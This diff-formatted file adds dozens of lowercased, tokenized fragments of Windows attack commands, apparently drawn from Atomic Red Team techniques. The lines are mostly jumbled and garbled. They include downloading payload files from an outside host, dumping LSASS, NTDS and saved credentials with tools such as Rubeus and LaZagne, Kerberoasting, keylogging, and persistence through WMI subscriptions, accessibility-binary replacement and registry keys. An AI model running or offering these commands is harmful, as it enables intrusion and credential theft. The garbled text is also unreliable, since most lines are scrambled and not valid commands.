@@ -1,0 +1,64 @@
+reg add `` kerberos : \users\ $ { target users '' '' ;
+`` a `` $ : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+vsiisexelauncher.exe -a /add
+net accounts
+sc query
+net stop = administrators }
+esentutl.exe /y
+curl http /r : :utf8.getstring /r c : save net.webclient ) /grant installscreensaver $ { -d ( new-object -comobject 'running
+get-ciminstance -classname win32_processor ) -excludeproperty `` http : -accepteula -s % new-object net.webclient ) \\ $ ( ( new-object net.securityprotocoltype -classname *
+quser
+ffuf -i -u $ { command } /sc 1 service name you create $ create
+put $ { service_name } @ `` hklm\software\microsoft\command keylog
+theharvester -d $ -sn $ target in $ { weak_service_name } '' `` .\ { output_image_path } -l $ { temp % \system32\osk.exe
+systeminfo
+$ shortcut = ) ' -class team
+get-item -path $ hklm\system\currentcontrolset\control\print\environments\windows x64\print processors\atomicredteam '' /v windir % \system32\osk.exe
+net user = `` cor_profiler '' ' c : \windows\temp\lsass_dump.dmp
+lazagne.exe windows
+reg add `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam % ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' '' threadingmodel ''
+psexec \\ { ip_address } -i -u $ { copy % copy system file ; /grant administrators : ' = `` ( $ shell.createshortcut ( `` keylog
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d -class activescripteventconsumer -arguments move-item
+.\rubeus.exe -u '' = `` $ : \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' rundll32.exe % \system32\windowspowershell\v1.0\powershell.exe '' $ '' \windows\system32\sethc.exe
+bitsadmin.exe /setnotifycmdline c : \windows\system32\sethc.exe
+cscript $ { source_file }
+net user defaultaccount binpath=
+net user defaultaccount /active : \users\
+domain user
+net user = `` = `` domain admins c : \users\
+psexec \\ { copy -- find `` dump_file } \windows\ntds\ntds.dit -- find ( $ _.status ' /f = ; -class -startaddress $ ( kerberoast //192.168.1.29:9000/payload/evil.exe ; querylanguage= : -comobject `` http : :logonpasswords
+$ filtertoconsumerbinding = keylog
+rubeus.exe kerberoast /domain
+get-childitem -filter `` : :logonpasswords
+net user /domain
+net user $ user /domain
+net user $ { nt\currentversion\winlogon\specialaccounts\userlist = $ { cor_profiler } '
+net user = @ '' \users\
+reg add `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 /domain
+.\rubeus.exe kerberoast windir % \system32\osk.exe % \system32\osk.exe
+vshadow dir `` popcalc.dll '' file : \windows\temp\dumpert.dmp
+fltmc.exe unload c : cor_profiler /grant administrators : -namespace : windir } you code
+net user administrator /domain
+`` a `` $ filterargs /user : = set-wmiinstance file : set-wmiinstance -namespace set-wmiinstance -namespace 'root/subscription execution options\svchost.exe '' -class options\svchost.exe '' -class -user /f
+lazagne.exe windows
+rundll32 popcalc.dll -verbose
+pktmon.exe start -- etw
+conhost.exe [ file rubeus.exe kerberoast \system\currentcontrolset\services\winsock2\parameters -name autodialdll , $ { ( ( .\procdump.exe \inprocserver32 ' set objws = start_address } -i -u $ { range_end )
+vssadmin create shadow /for=c
+rundll32 popcalc.dll , keylog
+net user = `` '' t1547.009 nt\currentversion\winlogon % \system32\osk.exe
+esentutl.exe /y $ { file_name }
+net user $ system file )
+namp -sn -l $ target /f ;
+remove-item -path `` $ -exec= $ { target_ip }
+ren $ { flie_name } abc.exe.txt
+net user `` $ shortcutlocation )
+net user administrator
+icacls : windir % \system32\osk.exe /grant administrators : administrators '' c : cor_profiler
+namp -sn $ { user_name } ;
+net user $ ( = target t1547.009 . `` hkcu\software\microsoft\windows ; eventnamespace='root\cimv2 -name `` threadingmodel '' $ `` atomic red \system32\osk.exe c : \users\
+`` -exec= $ { ip }
+query user
+$ shortcut = `` popcalc
+ffuf -w $ consumerargs
+/gui userinit.exe win32_pnpentity ' set -exec= $ { -classname /run : '' ' \\ and temp % \system32\osk.exe
